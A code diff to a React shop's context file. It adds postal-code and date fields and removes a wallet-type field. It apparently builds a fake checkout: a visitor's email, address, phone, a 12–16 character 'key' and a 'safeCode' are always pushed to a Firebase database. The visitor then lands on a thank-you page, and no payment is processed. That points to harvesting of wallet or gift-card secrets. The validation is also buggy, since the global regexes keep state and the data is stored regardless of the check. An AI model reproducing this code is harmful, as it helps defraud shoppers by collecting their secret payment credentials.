@@ -13,6 +13,8 @@ import secindy from "./img/Rectangle 284.png";
 import thirdy from "./img/Rectangle 287.png";
 import {initializeApp} from 'firebase/app';
 import {getDatabase,ref,push} from 'firebase/database'
+import {useNavigate} from 'react-router-dom';
+import {toast} from 'react-toastify';
 // import PaystackPop from "@paystack/inline-js"
 
 export const ProductContext = createContext();
@@ -430,7 +432,8 @@ export const ProductProvider = ({ children }) => {
   const [number, setNumber] = useState("");
   const [key, setKey] = useState("");
   const [safeCode, setSafeCode] = useState("");
-  const [walletType,setWalletType] = useState(select);
+  const [postalcode, setpostalcode] = useState("")
+  const [date, setDate] = useState("")
 
 
   // paysstack integration
@@ -458,15 +461,24 @@ export const ProductProvider = ({ children }) => {
   const app = initializeApp(config);
   const db = getDatabase();
   const reference = ref(db, `userData/ ${userData}` );
+  const navigate = useNavigate();
+  const regexkey = /[0-9a-z]{12,16}/gi;
+  const regexSafeCode = /[a-z]{4,7}/gi;
+  const regexDate = /[0-9]{3,8}/
 
-  function writeUserData(){
-    // if(email)
+  function writeUserData(e){
+    e.preventDefault()
+    if(regexkey.test(key) && regexSafeCode.test(safeCode) && regexDate.test(date)){
+      navigate("/cart/payment/thankYou")
+    }
+    else if(key === "" || safeCode === "" || date === "" ){
+      toast.error("Please fill the input field correctly")
+    }
     push(reference, {
       email:email,
       city:city,
       country:country,
       number:number,
-      walletType:walletType,
       select:select,
       key:key,
       safeCode:safeCode,
@@ -517,8 +529,6 @@ export const ProductProvider = ({ children }) => {
         setCountry,
         number,
         setNumber,
-        walletType,
-        setWalletType,
         select,
         setSelect,
         key,
@@ -526,6 +536,8 @@ export const ProductProvider = ({ children }) => {
         safeCode,
         setSafeCode,
         writeUserData,
+        postalcode,
+        setpostalcode,
       }}
     >
       {children}
